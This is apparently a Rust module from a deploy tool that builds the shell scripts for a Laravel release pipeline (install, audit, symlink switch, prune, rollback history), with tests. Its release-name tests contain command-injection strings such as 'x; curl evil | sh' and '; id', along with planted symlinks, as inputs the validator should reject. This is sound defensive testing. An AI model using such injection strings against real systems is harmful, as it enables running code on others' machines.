//! The deploy pipeline as data: each step's name, who runs it in the guest, its script, and
//! whether it needs the Build lease (package hosts open).
use crate::config::Config;

pub const BASE: &str = "/srv/app";

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum As {
    Deploy,
    App,
    Root,
}

#[derive(Debug, Clone)]
pub struct Step {
    pub name: &'static str,
    pub run_as: As,
    /// A bash script fed on stdin; empty for the steps bunker does itself (upload, write_env).
    pub cmd: String,
    pub needs_lease: bool,
}

const PROXY: &str = "export http_proxy=http://127.0.0.1:3128 https_proxy=http://127.0.0.1:3128 \
HTTP_PROXY=http://127.0.0.1:3128 HTTPS_PROXY=http://127.0.0.1:3128 no_proxy=localhost,127.0.0.1 \
NO_PROXY=localhost,127.0.0.1";

fn step(name: &'static str, run_as: As, cmd: String, needs_lease: bool) -> Step {
    Step {
        name,
        run_as,
        cmd,
        needs_lease,
    }
}

/// A script that runs in the release directory (and through the proxy, for lease steps).
fn in_release(dir: &str, lease: bool, body: &str) -> String {
    let proxy = if lease {
        format!("{PROXY}\n")
    } else {
        String::new()
    };
    format!("set -euo pipefail\n{proxy}cd {dir}\n{body}\n")
}

/// Caches config as app, then takes it out of reach of every other guest user: bootstrap/cache's
/// default ACL makes new files world-readable, and config.php holds every secret.
pub const CONFIG_CACHE: &str = "php artisan config:cache\nchmod 0640 bootstrap/cache/config.php";

/// Re-caches config in `dir` (a release, or `/srv/app/current`); runs as app.
pub fn recache_script(dir: &str) -> String {
    in_release(dir, false, CONFIG_CACHE)
}

fn hooks(cmds: &[String]) -> String {
    if cmds.is_empty() {
        "true".into()
    } else {
        cmds.join("\n")
    }
}

/// The steps for one deploy, in order. `write_env` runs before `caches` (config:cache needs .env,
/// which a first deploy doesn't have yet).
pub fn steps(cfg: &Config, release: &str, first: bool, allow_advisories: bool) -> Vec<Step> {
    let dir = format!("{BASE}/releases/{release}");
    let audit = |cmd: &str, what: &str| {
        if allow_advisories {
            format!(
                "{cmd} || echo \"bunker: {what} found advisories (allowed by --allow-advisories)\" >&2"
            )
        } else {
            cmd.to_string()
        }
    };
    let node = cfg.node.is_some();
    let mut s = vec![step("upload", As::Deploy, String::new(), false)];
    s.push(step(
        "composer_install",
        As::Deploy,
        in_release(
            &dir,
            true,
            "composer install --no-dev --no-interaction --prefer-dist --optimize-autoloader --no-progress",
        ),
        true,
    ));
    if node {
        s.push(step(
            "npm_build",
            As::Deploy,
            in_release(
                &dir,
                true,
                "if [ -f package-lock.json ]; then npm ci --no-audit --no-fund; else npm install --no-audit --no-fund; fi\n\
npm run build\nrm -rf node_modules",
            ),
            true,
        ));
    }
    s.push(step(
        "composer_audit",
        As::Deploy,
        in_release(
            &dir,
            true,
            &audit(
                "composer audit --no-dev --abandoned=report",
                "composer audit",
            ),
        ),
        true,
    ));
    if node {
        s.push(step(
            "npm_audit",
            As::Deploy,
            in_release(
                &dir,
                true,
                &audit("npm audit --omit=dev --audit-level=high", "npm audit"),
            ),
            true,
        ));
    }
    // All as deploy, which owns the release: app gets write access to bootstrap/cache through an
    // ACL deploy sets on its own directory, so no root call ever resolves a path in the release.
    s.push(step(
        "link_shared",
        As::Deploy,
        in_release(
            &dir,
            false,
            &format!(
                "rm -rf storage\nln -sfn {BASE}/shared/storage storage\nln -sfn {BASE}/shared/.env .env\n\
mkdir -p bootstrap/cache\nsetfacl -m u:app:rwx,d:u:app:rwx bootstrap/cache"
            ),
        ),
        false,
    ));
    if first {
        s.push(step("write_env", As::Root, String::new(), false));
        s.push(step(
            "first_deploy_hooks",
            As::App,
            in_release(&dir, false, &hooks(&cfg.hooks.first_deploy)),
            false,
        ));
    }
    s.push(step(
        "caches",
        As::App,
        in_release(
            &dir,
            false,
            &format!("{CONFIG_CACHE}\nphp artisan route:cache\nphp artisan view:cache"),
        ),
        false,
    ));
    s.push(step(
        "before_switch_hooks",
        As::App,
        in_release(&dir, false, &hooks(&cfg.hooks.before_switch)),
        false,
    ));
    s.push(step(
        "switch",
        As::Root,
        switch_script(BASE, release),
        false,
    ));
    s.push(step("reload", As::Root, reload_script(cfg), false));
    s.push(step("prune", As::Root, prune_script(BASE), false));
    s
}

/// Reloads php-fpm (new workers pick up the new `current`) and restarts every worker.
pub fn reload_script(cfg: &Config) -> String {
    let mut s = format!("set -euo pipefail\nsystemctl reload php{}-fpm\n", cfg.php);
    for name in cfg.workers.keys() {
        s.push_str(&format!("systemctl restart bunker-worker-{name}.service\n"));
    }
    s
}

/// `YYYYMMDDTHHMMSSZ-<7 hex>` with an optional `-dirty`: the only names a root script may see.
/// releases/ belongs to deploy, which runs third-party scripts and could plant any name there.
pub fn is_release_name(s: &str) -> bool {
    let s = s.strip_suffix("-dirty").unwrap_or(s);
    let b = s.as_bytes();
    let digits = |r: std::ops::Range<usize>| b[r].iter().all(u8::is_ascii_digit);
    b.len() == 24
        && digits(0..8)
        && b[8] == b'T'
        && digits(9..15)
        && b[15] == b'Z'
        && b[16] == b'-'
        && b[17..]
            .iter()
            .all(|c| c.is_ascii_digit() || (b'a'..=b'f').contains(c))
}

/// Points `current` at `releases/<release>` with one rename, then records it in `history`, the
/// root-owned list of releases that went live. Rollback picks from it, so a release that was
/// uploaded but never switched to (an interrupted deploy) is never a rollback target.
pub fn switch_script(base: &str, release: &str) -> String {
    format!(
        "set -euo pipefail\n\
if [ ! -e {base}/history ] && [ -L {base}/current ]; then\n\
  basename \"$(readlink -f {base}/current)\" >> {base}/history\n\
fi\n\
ln -sfn releases/{release} {base}/current.tmp\nmv -T {base}/current.tmp {base}/current\nprintf '%s\\n' {release} >> {base}/history\n"
    )
}

/// `releases`: real directories (not symlinks) with release names, sorted, one per line. `cur`:
/// current's release. `prev`: the newest entry in `history` that isn't `cur` and is still a real
/// release directory; empty when there is none (or no history yet).
fn current_and_previous(base: &str) -> String {
    format!(
        "releases() {{\n\
  for p in {base}/releases/*; do\n\
    n=${{p##*/}}\n\
    if [ -d \"$p\" ] && [ ! -L \"$p\" ] && [[ $n =~ ^[0-9]{{8}}T[0-9]{{6}}Z-[0-9a-f]{{7}}(-dirty)?$ ]]; then\n\
      printf '%s\\n' \"$n\"\n\
    fi\n\
  done | sort\n\
}}\n\
cur=$(basename \"$(readlink -f {base}/current)\")\n\
prev=\n\
if [ -f {base}/history ]; then\n\
  while IFS= read -r n; do\n\
    p={base}/releases/$n\n\
    if [ \"$n\" != \"$cur\" ] && [[ $n =~ ^[0-9]{{8}}T[0-9]{{6}}Z-[0-9a-f]{{7}}(-dirty)?$ ]] && [ -d \"$p\" ] && [ ! -L \"$p\" ]; then\n\
      prev=$n\n\
      break\n\
    fi\n\
  done < <(awk '{{ l[NR] = $0 }} END {{ for (i = NR; i > 0; i--) print l[i] }}' {base}/history)\n\
fi\n"
    )
}

/// Deletes all but the newest five releases, never `current` or the one before it.
pub fn prune_script(base: &str) -> String {
    format!(
        "set -euo pipefail\n{}cd {base}/releases\n\
releases | sort -r | tail -n +6 | while IFS= read -r r; do\n\
  if [ \"$r\" != \"$cur\" ] && [ \"$r\" != \"$prev\" ]; then rm -rf -- \"$r\"; fi\n\
done\n",
        current_and_previous(base)
    )
}

/// Prints `current=<name>` and `previous=<name or empty>`.
pub fn releases_script(base: &str) -> String {
    format!(
        "set -euo pipefail\n{}printf 'current=%s\\nprevious=%s\\n' \"$cur\" \"$prev\"\n",
        current_and_previous(base)
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(node: bool) -> Config {
        let mut c = Config::parse(&crate::config::fixture_config()).unwrap();
        c.node = node.then(|| "22".into());
        c
    }

    fn names(s: &[Step]) -> Vec<&str> {
        s.iter().map(|s| s.name).collect()
    }

    /// Runs `releases_script` with bash against a fake /srv/app and returns its two fields.
    fn run_releases(live: &[&str], extra: &[&str], current: &str) -> (String, String) {
        let d = tempfile::tempdir().unwrap();
        let base = d.path().to_str().unwrap();
        for r in live.iter().chain(extra) {
            std::fs::create_dir_all(d.path().join("releases").join(r)).unwrap();
        }
        let hist: String = live.iter().map(|r| format!("{r}\n")).collect();
        if !live.is_empty() {
            std::fs::write(d.path().join("history"), hist).unwrap();
        }
        std::os::unix::fs::symlink(format!("releases/{current}"), d.path().join("current"))
            .unwrap();
        let out = std::process::Command::new("bash")
            .arg("-c")
            .arg(releases_script(base))
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let s = String::from_utf8(out.stdout).unwrap();
        let f = |k: &str| {
            s.lines()
                .find_map(|l| l.strip_prefix(k))
                .unwrap_or("")
                .to_string()
        };
        (f("current="), f("previous="))
    }

    const R1: &str = "20261116T000001Z-aaaaaaa";
    const R2: &str = "20261116T000002Z-bbbbbbb";
    const R3: &str = "20261116T000003Z-ccccccc";

    #[test]
    fn previous_is_the_last_release_that_went_live_not_the_next_name_down() {
        // R2 was uploaded but never switched to (an interrupted deploy left it behind).
        assert_eq!(run_releases(&[R1, R3], &[R2], R3), (R3.into(), R1.into()));
    }

    #[test]
    fn previous_skips_history_entries_that_are_gone_or_not_release_names() {
        // R1 went live but was pruned; only R3 remains, so there is nothing to roll back to.
        let (c, p) = run_releases(&[R3], &[], R3);
        assert_eq!((c.as_str(), p.as_str()), (R3, ""));
    }

    #[test]
    fn no_history_means_no_previous() {
        assert_eq!(run_releases(&[], &[R1, R2], R2), (R2.into(), "".into()));
    }

    #[test]
    fn switch_records_the_release_in_root_owned_history() {
        let s = switch_script("/srv/app", R2);
        assert!(s.contains(&format!("printf '%s\\n' {R2} >> /srv/app/history")));
        assert!(s.find("mv -T").unwrap() < s.rfind(">> /srv/app/history").unwrap());
    }

    #[test]
    fn first_switch_with_history_seeds_it_with_the_release_already_live() {
        // VMs deployed before history existed: the live release must stay a rollback target.
        let s = switch_script("/srv/app", R2);
        let seed = s
            .find("if [ ! -e /srv/app/history ] && [ -L /srv/app/current ]; then")
            .expect("seeds history");
        assert!(seed < s.find("ln -sfn").unwrap());
        assert!(s.contains("basename \"$(readlink -f /srv/app/current)\" >> /srv/app/history"));
    }

    #[test]
    fn config_cache_is_left_unreadable_to_other_guest_users() {
        // bootstrap/cache inherits a default ACL that makes new files world-readable, and
        // config.php holds every secret; deploy runs third-party scripts and must not read it.
        let s = steps(&cfg(false), "r1", false, false);
        let caches = s.iter().find(|s| s.name == "caches").unwrap();
        assert!(
            caches
                .cmd
                .contains("php artisan config:cache\nchmod 0640 bootstrap/cache/config.php")
        );
        assert!(recache_script("/srv/app/releases/r1").contains("cd /srv/app/releases/r1\nphp artisan config:cache\nchmod 0640 bootstrap/cache/config.php"));
    }

    #[test]
    fn steps_order_first_deploy() {
        let s = steps(&cfg(true), "r1", true, false);
        assert_eq!(
            names(&s),
            [
                "upload",
                "composer_install",
                "npm_build",
                "composer_audit",
                "npm_audit",
                "link_shared",
                "write_env",
                "first_deploy_hooks",
                "caches",
                "before_switch_hooks",
                "switch",
                "reload",
                "prune"
            ]
        );
        let leased: Vec<&str> = s.iter().filter(|s| s.needs_lease).map(|s| s.name).collect();
        assert_eq!(
            leased,
            [
                "composer_install",
                "npm_build",
                "composer_audit",
                "npm_audit"
            ]
        );
    }

    #[test]
    fn steps_order_later_deploy() {
        let s = steps(&cfg(false), "r1", false, false);
        assert_eq!(
            names(&s),
            [
                "upload",
                "composer_install",
                "composer_audit",
                "link_shared",
                "caches",
                "before_switch_hooks",
                "switch",
                "reload",
                "prune"
            ]
        );
    }

    #[test]
    fn steps_run_as_the_right_user() {
        let s = steps(&cfg(true), "r1", true, false);
        let by = |n: &str| s.iter().find(|s| s.name == n).unwrap().run_as;
        assert_eq!(by("composer_install"), As::Deploy);
        assert_eq!(by("caches"), As::App);
        assert_eq!(by("before_switch_hooks"), As::App);
        assert_eq!(by("first_deploy_hooks"), As::App);
        assert_eq!(by("switch"), As::Root);
    }

    #[test]
    fn root_steps_never_follow_release_paths() {
        // Release contents belong to deploy, which runs third-party composer and npm scripts.
        for s in steps(&cfg(true), "r1", true, false) {
            if s.run_as == As::Root {
                // Work inside the release runs as deploy; root itself only chgrp -h (which changes
                // a symlink, never its target), rm -rf, ln and mv.
                for line in s
                    .cmd
                    .lines()
                    .filter(|l| !l.trim_start().starts_with("runuser -u deploy --"))
                {
                    assert!(
                        !line.contains("chmod") && !line.contains("chown"),
                        "{}: {line}",
                        s.name
                    );
                    if line.contains("chgrp") {
                        assert!(line.contains("chgrp -h"), "{}: {line}", s.name);
                    }
                }
            }
        }
    }

    #[test]
    fn link_shared_needs_no_root() {
        // A root chgrp, even with -h, follows a symlinked parent component (bootstrap -> /var)
        // that deploy, or a process a composer script left running, could plant.
        let s = steps(&cfg(true), "r1", true, false);
        let link = s.iter().find(|s| s.name == "link_shared").unwrap();
        assert_eq!(link.run_as, As::Deploy);
        assert!(
            link.cmd
                .contains("setfacl -m u:app:rwx,d:u:app:rwx bootstrap/cache"),
            "{}",
            link.cmd
        );
        assert!(s.iter().all(|s| !s.cmd.contains("chgrp")));
    }

    #[test]
    fn switch_is_an_atomic_rename() {
        let s = switch_script("/srv/app", "20261116T030405Z-abc1234");
        assert!(s.contains("ln -sfn releases/20261116T030405Z-abc1234 /srv/app/current.tmp"));
        assert!(s.contains("mv -T /srv/app/current.tmp /srv/app/current"));
    }

    #[test]
    fn audit_advisories_refuse_unless_allowed() {
        let audit = |allow| {
            steps(&cfg(true), "r1", false, allow)
                .into_iter()
                .filter(|s| s.name.ends_with("_audit"))
                .map(|s| s.cmd)
                .collect::<Vec<_>>()
        };
        for cmd in audit(false) {
            assert!(
                !cmd.contains("||"),
                "an audit failure must fail the step: {cmd}"
            );
        }
        for cmd in audit(true) {
            assert!(
                cmd.contains("|| echo"),
                "allowed advisories are reported, not fatal: {cmd}"
            );
        }
    }

    fn run(script: &str) -> std::process::Output {
        std::process::Command::new("/bin/bash")
            .args(["-c", script])
            .output()
            .unwrap()
    }

    #[test]
    fn prune_keeps_five_and_never_current() {
        let d = tempfile::tempdir().unwrap();
        let base = d.path().to_str().unwrap();
        let rel = d.path().join("releases");
        let all: Vec<String> = (1..=9)
            .map(|i| format!("20261116T00000{i}Z-aaaaaaa"))
            .collect();
        for r in &all {
            std::fs::create_dir_all(rel.join(r)).unwrap();
        }
        // All nine went live, then a rollback to the 2nd oldest: it survives, and so does its
        // previous, the 9th (the release the rollback left).
        let hist: String = all
            .iter()
            .chain([&all[1]])
            .map(|r| format!("{r}\n"))
            .collect();
        std::fs::write(d.path().join("history"), hist).unwrap();
        std::os::unix::fs::symlink(format!("releases/{}", all[1]), d.path().join("current"))
            .unwrap();
        let out = run(&prune_script(base));
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let mut left: Vec<String> = std::fs::read_dir(&rel)
            .unwrap()
            .map(|e| e.unwrap().file_name().into_string().unwrap())
            .collect();
        left.sort();
        let want: Vec<String> = [1, 4, 5, 6, 7, 8].iter().map(|&i| all[i].clone()).collect();
        assert_eq!(left, want);
    }

    #[test]
    fn release_names_are_bunkers_format_only() {
        assert!(is_release_name("20261116T030405Z-abc1234"));
        assert!(is_release_name("20261116T030405Z-abc1234-dirty"));
        for bad in [
            "",
            "x; curl evil | sh",
            "20261116T030405Z-abc1234; id",
            "20261116T030405Z-ABC1234",
            "20261116T030405Z-abc123",
            "../20261116T030405Z-abc1234",
            "20261116T030405Z-abc1234 ",
        ] {
            assert!(!is_release_name(bad), "{bad:?}");
        }
    }

    #[test]
    fn releases_script_ignores_planted_names_and_symlinks() {
        // deploy owns releases/ and runs third-party scripts: it can plant anything there.
        let d = tempfile::tempdir().unwrap();
        let base = d.path().to_str().unwrap();
        let rel = d.path().join("releases");
        for r in [
            "20261116T000001Z-aaaaaaa",
            "20261116T000002Z-aaaaaaa",
            "20261116T000003Z-aaaaaaa",
        ] {
            std::fs::create_dir_all(rel.join(r)).unwrap();
        }
        std::fs::create_dir_all(rel.join("20261116T000002Z-zzzzzzz; id")).unwrap();
        std::os::unix::fs::symlink("/", rel.join("20261116T000002Z-bbbbbbb")).unwrap();
        // history is root's, but the names in it still have to be real release directories.
        std::fs::write(
            d.path().join("history"),
            "20261116T000001Z-aaaaaaa\n20261116T000002Z-aaaaaaa\n20261116T000002Z-zzzzzzz; id\n20261116T000002Z-bbbbbbb\n20261116T000003Z-aaaaaaa\n",
        )
        .unwrap();
        std::os::unix::fs::symlink(
            "releases/20261116T000003Z-aaaaaaa",
            d.path().join("current"),
        )
        .unwrap();
        let out = run(&releases_script(base));
        assert_eq!(
            String::from_utf8_lossy(&out.stdout),
            "current=20261116T000003Z-aaaaaaa\nprevious=20261116T000002Z-aaaaaaa\n"
        );
    }

    #[test]
    fn releases_script_finds_previous() {
        let d = tempfile::tempdir().unwrap();
        let base = d.path().to_str().unwrap();
        let n = |i: u32| format!("20261116T00000{i}Z-aaaaaaa");
        for i in 1..=3 {
            std::fs::create_dir_all(d.path().join("releases").join(n(i))).unwrap();
        }
        std::fs::write(
            d.path().join("history"),
            format!("{}\n{}\n{}\n", n(1), n(2), n(3)),
        )
        .unwrap();
        std::os::unix::fs::symlink(format!("releases/{}", n(3)), d.path().join("current")).unwrap();
        let out = run(&releases_script(base));
        assert_eq!(
            String::from_utf8_lossy(&out.stdout),
            format!("current={}\nprevious={}\n", n(3), n(2))
        );
        // Only the first release ever went live: nothing to roll back to.
        std::fs::write(d.path().join("history"), format!("{}\n", n(1))).unwrap();
        std::fs::remove_file(d.path().join("current")).unwrap();
        std::os::unix::fs::symlink(format!("releases/{}", n(1)), d.path().join("current")).unwrap();
        let out = run(&releases_script(base));
        assert_eq!(
            String::from_utf8_lossy(&out.stdout),
            format!("current={}\nprevious=\n", n(1))
        );
    }
}
